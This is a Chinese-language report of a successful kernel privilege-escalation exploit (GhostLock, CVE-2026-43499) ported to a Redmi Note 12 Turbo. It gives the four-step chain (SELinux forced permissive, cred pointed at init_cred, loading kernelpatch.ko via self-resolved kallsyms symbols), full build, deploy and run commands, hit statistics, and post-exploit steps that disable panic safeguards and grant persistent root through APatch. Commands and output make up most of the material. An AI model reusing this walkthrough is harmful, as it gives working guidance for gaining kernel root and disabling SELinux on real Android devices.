# GhostLock (CVE-2026-43499) 5.10 移植 —— 成功报告

> 时间：2026-09-11 11:20
> 设备：Xiaomi marble / Redmi Note 12 Turbo
> 内核：`5.10.149-android12-9-00001-gda3d81545d1d-ab9545656`
> 结论：**目标全部达成** —— 漏洞验证 ✓ / 拿到 root ✓ / 对接 APatch 管理器 ✓

---

## 一、现场证据（原文）

```
$ adb shell su -c id
uid=0(root) gid=773237888 groups=773237888 context=u:r:kernel:s0

$ adb shell grep kernelpatch /proc/modules
kernelpatch 126976 0 - Live 0x0000000000000000 (O)

$ adb shell ls /sys/module/kernelpatch/
coresize holders initsize initstate notes refcnt scmversion
sections srcversion taint uevent version

$ adb shell "su -c 'ls -la /data/adb/ap/'"
drwx------ bin
-rw-rw-rw- jailbreak
drwx------ log
-rw------- package_config
-rw------- su_path          → /system/bin/su
-rw-r--r-- sucompat
-rw------- version           → 11107

$ adb shell "su -c 'cat /sys/module/kernelpatch/version'"     0.13.8
$ adb shell "su -c 'cat /sys/module/kernelpatch/srcversion'"  BE9DCADB1E54CF1CCDAB24C

# 用 root 关掉两个重启开关（此后调试不再每轮重启）
panic_on_oops=0  panic_on_rcu_stall=0
```

`su -c id` 在命中后**连续 25 秒逐次复测均返回 uid=0**，不是偶发。

---

## 二、成功链路（四步）

```
① W1: selinux_enforcing := <页地址>        → permissive
② W2: task->cred := init_cred              → uid 0
        └ 副作用写必然落在 init_cred+8 = gid 字段 → gid 变垃圾（无害，但禁止 exec）
③ 在 exploit 进程内加载 kernelpatch.ko      → 模块进内核
④ 保活，从设备外验证                        → su / 管理器就绪
```

### ③ 是本次最关键的突破：用户态 ELF 符号重定位

`kernelpatch.ko` 引用了 **13 个本内核未导出**的符号
（`kallsyms_lookup_name`、`set_fixmap`、`commit_creds`、`prepare_kernel_cred`、
`kernel_read`、`iterate_dir`、`__put_cred` …）。
裸 `insmod` / `finit_module` 走内核 `__ksymtab` 解析 → 必然 `ENOENT(2)`，
而 toybox 把它显示成 `No such file or directory`，**极易误判成文件问题或 vermagic 问题**。

**正解**（main.c `kpatch_relocate_and_load()`，复刻 APatch `apd/src/insmod.rs`）：

1. `kptr_restrict = 1`（我们持有 init_cred，满 caps，地址可见）
2. 读入 `.ko`，解析 `Elf64_Ehdr` → `SHT_SYMTAB` → 由 `sh_link` 取 strtab
3. 收集全部 `SHN_UNDEF` 符号（实测 62 个）
4. 逐行读 `/proc/kallsyms`，命中则改写 `st_shndx = SHN_ABS`、`st_value = addr`
5. `syscall(__NR_init_module, buf, size, "")`

实测结果：`resolved=62/62`、`init_module rc=0 errno=0`、`module_loaded=1`。

### 两个被证伪的错误方向（留档，避免重走）

| 曾经的结论 | 实际情况 |
|---|---|
| 「vermagic 不匹配导致加载失败」 | CONFIG_MODVERSIONS 下 `same_magic()` 只比较第一个空格**之后**的文本，版本号被忽略。kmsg 里 `vermagic` 报错数为 **0** |
| 「缺 13 个符号 = 死路」 | 那只是**内核不帮忙解析**，自己查地址填进去即可（即上文的③） |

### ④ 为什么必须"进程内加载 + 保活"

- **不能 exec**：exec 会用被污染的 cred 重建副本，新镜像在第一条指令前就死。
  实测 3 次命中都只留下"脚本文件完整落盘、但一行都没执行"。
- **不能做 setgid/setuid**：`task->cred` 直指**全局 init_cred**，而 `commit_creds()`
  会对旧 cred 做 `put_cred()`（对共享内核对象 `atomic_dec_and_test`）—— 这是崩溃源。
  而且它原理上也帮不上忙：exec 会重建 cred，修 gid 传不过去。
- **加载后什么都不做，只保活**：实测设备带着 kpatch **稳定存活 170 秒以上**。

---

## 三、复现步骤

```bash
export ANDROID_HOME=<SDK>
DEV=3e6f1443

# 1. 编译（NDK 28.2）
cd <ARCHIVE>
"<NDK>/toolchains/llvm/prebuilt/<prebuilt>/bin/aarch64-linux-android35-clang.cmd" \
  -O2 -flto -Wall -Isrc/core -Isrc/kernels -DTARGET_CONFIG_H=\"target.h\" \
  -fPIE -pie -pthread src/core/main.c src/core/offsets_json.c src/core/util.c src/core/fops.c \
  -o ghostlock

# 2. 部署（adb.exe 必须用 Windows 盘符路径）
adb -s $DEV push <ARCHIVE>/ghostlock        /data/local/tmp/ghostlock
adb -s $DEV push <ARCHIVE_DIR>/android12-5.10_kernelpatch.ko  /data/local/tmp/kernelpatch.ko
adb -s $DEV shell 'chmod 755 /data/local/tmp/ghostlock'

# 3. 跑循环（命中即停）
cd <ARCHIVE_DIR> && ROUNDS=30 REBOOT_EVERY=0 bash gl_tune.sh > gl_run.out 2>&1

# 4. 另开一个终端独立轮询（关键：不能等 gl_tune 的输出）
bash <ARCHIVE_DIR>/_watcher.sh

# 5. 命中后验证
adb -s $DEV shell 'su -c id'
adb -s $DEV shell 'grep kernelpatch /proc/modules'
adb -s $DEV shell 'su -c "ls -la /data/adb/ap/"'

# 6. 让管理器重新读取内核状态
adb -s $DEV shell 'am force-stop me.bmax.apatch; am start -n me.bmax.apatch/me.bmax.apatch.ui.MainActivity'

# 7. jailbreak 最后一步：软重启（只重启框架，内核不动 → 模块保留）
adb -s $DEV shell "su -c 'chmod 755 /data/local/tmp/libapd.so; /data/local/tmp/libapd.so soft-reboot'"
sleep 45
adb -s $DEV shell 'cat /proc/uptime'                 # 应只涨几十秒（内核没重启）
adb -s $DEV shell 'grep -c kernelpatch /proc/modules' # 应为 1（模块还在）

# 8. 关键：soft-reboot 会把 sys.boot_completed 置 0 而没人置回 1 → 必须手动修
adb -s $DEV shell "su -c '/data/adb/ap/bin/apd resetprop sys.boot_completed 1'"
adb -s $DEV shell 'am force-stop me.bmax.apatch; am start -n me.bmax.apatch/me.bmax.apatch.ui.MainActivity'
sleep 10

# 9. 最终验证：应是 gid=0 + magisk 域 + MagicaService 在跑
adb -s $DEV shell 'su -c id'
adb -s $DEV shell 'ps -A -o NAME | grep -i apatch'
```

**关键环境变量**（烘焙进 root script，勿用 env 传）：`GHOSTLOCK_HOLD=1`、
`GHOSTLOCK_SELF_W2=1`、`GHOSTLOCK_INSMOD_ONLY=1`、`GHOSTLOCK_SKIP_POLICY_FIXUP=1`、
`GHOSTLOCK_LAYOUT=A`、`GHOSTLOCK_SHIFT=-2`。

---

## 五、软重启（jailbreak 模式的最后一步）

kpatch 是**热加载**进内核的，装机时初始化过的 Android 框架**并不知道它的存在**，
所以 APatch 会停在"越狱已触发，等待获取 root 后软重启"。

**软重启 = 只重启 Android 框架，不重启内核**（内核一重启，runtime 加载的模块就没了）。

### 执行方式（APatch 原生实现，最稳）

APatch 自带该功能，`apd` 的 `soft-reboot` 子命令
（`apd/src/event.rs::soft_reboot`：`daemonize()` → `switch_mnt_ns(1)` →
`set_prop("sys.boot_completed","0")` → `stop` → `on_post_data_fs` → `start` → `on_services`）：

```bash
adb shell "su -c 'chmod 755 /data/local/tmp/libapd.so; /data/local/tmp/libapd.so soft-reboot'"
```

**验证内核确实没重启**：`uptime` 从 671s → 726s（只涨 55s），`kernelpatch` 仍在 `/proc/modules`。

### ⚠️ 踩到的坑：`sys.boot_completed` 卡在 0

重启后 APatch **仍**显示"等待软重启"。诊断：

| 检查项 | 结果 |
|---|---|
| `init.svc.zygote` | running |
| `system_server` | 在跑，但 **PID 很小（未重启）** |
| `sys.boot_completed` | **0，且一直不变** |

**根因**：软重启把 `sys.boot_completed` 置 0，等 `system_server` 重启完成后再置 1；
但这次 `system_server` 并未真正重启，**没有任何人把它改回 1**。而 APatch 正是靠这个标志
判断"是否重启完成"，所以一直停在等待态。

**修法**：用 APatch 自带的属性工具绕过属性权限直接改回：

```bash
# 注意：resetprop 是 apd 的**子命令**，不能靠符号链接直接调用
#   /data/adb/ap/bin/resetprop sys.boot_completed 1   ✗ 报 unrecognized subcommand
#   /data/adb/ap/bin/apd resetprop sys.boot_completed 1   ✓
adb shell "su -c '/data/adb/ap/bin/apd resetprop sys.boot_completed 1'"
adb shell 'am force-stop me.bmax.apatch; am start -n me.bmax.apatch/me.bmax.apatch.ui.MainActivity'
```

### 软重启前后的质变

| | 软重启前 | 软重启后 |
|---|---|---|
| root 来源 | 内核 hook 临时给 | **APatch 正规通道** |
| `su -c id` | `gid=773237888`（垃圾） | **`gid=0(root)`** |
| 附加组 | 垃圾值 | **`0,1004(input),1007(log),1011(adb),1015(sdcard_rw),…`** |
| SELinux 域 | `u:r:kernel:s0`（异常） | **`u:r:magisk:s0`（正常 root 域）** |
| `which su` | — | `/system/bin/su`，版本 `11107:APatch` |
| APatch 服务 | 未启动 | **`MagicaService` / `apatch_zygote` / `apatch:root:0` 全部运行** |

软重启后的 `su -c id` 完整输出：

```
uid=0(root) gid=0(root)
groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs)
context=u:r:magisk:s0
```

### ⚠️ 踩到的坑之二（真正的最后一块拼图）：`package_config` 为空

修好 `boot_completed` 后 APatch **仍**显示"越狱已触发，等待获取 root 后软重启"。
读源码逐层定位（全部有源码依据，非猜测）：

1. `Home.kt`：按钮文案由 `isJailbreak` 决定 ——
   `isJailbreak -> Text("软重启")`；否则显示"越狱"按钮
   （显示条件 `kpState == UNKNOWN_STATE && isPermissive`）。
2. `APatchCli.kt:438`：`isJailbreakMode()` = **`SuFile(/data/adb/ap/jailbreak).exists()`**
   —— **读这个文件需要 APatch 自己有 root shell**，而该文件本来就存在。
3. 所以问题变成「**APatch 应用自己拿不到 root**」。
   `apd` 加载 kpatch 时的日志早已点明：**`/data/adb/ap/package_config empty`**。

**机制**（`apd/src/package.rs` + `supercall.rs`）：

- `package_config` 是 **CSV**：`pkg, exclude, allow, uid, to_uid, sctx`；
  `allow==1 && exclude==0` 表示授权。
- `refresh_ap_package_list()` 读表并逐条 `sc_su_grant_uid()` 通过 supercall 授予内核。
- `event.rs` 里 superkey **硬编码为 `su`**；**uid-listener 用 inotify 监听
  `/data/adb/ap/`**，检测到 rename 即自动刷新。
- app 与内核通信并不用 `su`，而是 **`SUPERCMD = "/system/bin/truncate"`**
  （kpatch 拦截 `truncate` 的 execve 作 supercall 载体；内核日志实测：
  `execve /system/bin/truncate by uid 2000: granting root` → `redirect to /system/bin/sh`）。
  `nativeReady(key)` = `sc_hello(key) == SUPERCALL_HELLO_MAGIC`，走
  `syscall(__NR_supercall = 45, ...)`（kpatch 劫持的 syscall 45）。

**修法**：

```bash
# 1) 启动 inotify 监听器（平时 apd 并未作为服务运行，所以它是停的）
adb shell "su -c 'nohup /data/adb/ap/bin/apd uid-listener </dev/null >>/data/adb/ap/log/uid_listener.log 2>&1 &'"

# 2) 写授权表，并用 rename 落地（rename 才会触发监听器）
adb shell "su -c 'printf \"pkg,exclude,allow,uid,to_uid,sctx\nme.bmax.apatch,0,1,10270,0,u:r:magisk:s0\n\" \
  > /data/adb/ap/package_config.tmp && mv /data/adb/ap/package_config.tmp /data/adb/ap/package_config'"
```

apd 日志确认授权成功：

```
[shutdown] Caught signal 15, refreshing package list...
[refresh_ap_package_list] Skip revoking critical uid: 0
[refresh_ap_package_list] Skip revoking critical uid: 2000
[refresh_ap_package_list] Loading me.bmax.apatch: result = 0     ← 0 = 成功
```

**决定性验证** —— APatch 应用 fork 出了 UID=0 的子进程：

```
 8780  1153 10270 me.bmax.apatch      ← 应用本体
15079  8780     0 sh                  ← ★ 它的子进程，UID=0
15089  8780     0 sh
15093  8780     0 sh
```

**副产品认知**：`/data/adb/apd`（1837000 B，kpatch 把 `su` 重定向到此）
与 `/data/adb/ap/bin/apd`（3969440 B）是**两个不同的二进制**。

---

## 六、统计与局限性

- **单轮命中率约 5–8%**（今日 6 次命中分别落在第 28、7、1、1、22、1 轮）。
  单轮约 60–70 秒，其中绝大部分是 PANIC 后等设备重启。
- 每轮有 **95% 概率成功触发写原语**，但"写对位置"只有约 5% ——
  瓶颈是**栈/内存布局稳定性**，不是漏洞触发。
- **模块是 runtime 加载的，重启后失效**（符合原定需求"不要求跨重启持久"）。
  重启后需重新利用一次。
- 命中后设备会因 W2 的副作用（cred 被指向全局 init_cred）在数分钟内不稳定；
  本次已用 root 关掉 `panic_on_oops` 与 `panic_on_rcu_stall`，可显著延长可用窗口。

---

## 七、诊断方法论（可复用）

1. **stdout 不可信**：重定向到文件后是全缓冲，崩溃时最后几行必丢。
   关键信息一律 `write()+fsync()`，并**双写 `/sdcard`**
   （`/data/local/tmp` 里由 kernel 域创建的文件 adb shell 读不了）。
2. **分段隔离**：把"可疑动作"逐个抽掉做对照（如本次把加载后的所有调用抽空、只保活），
   一次实验就能把崩点钉死。
3. **验证通道要与被测进程解耦**：`adb shell ./ghostlock` 会阻塞到进程退出，
   必须另起**独立轮询**，否则永远错过窗口。
4. **离线优先**：`_preflight.sh`（校验 .ko 的 undefined 符号是否都在设备 kallsyms 里）、
   `_check_script.py`（重建 root script 并 `bash -n`）、`bash -n gl_tune.sh`
   —— 全部零设备成本，比上机快两个数量级。
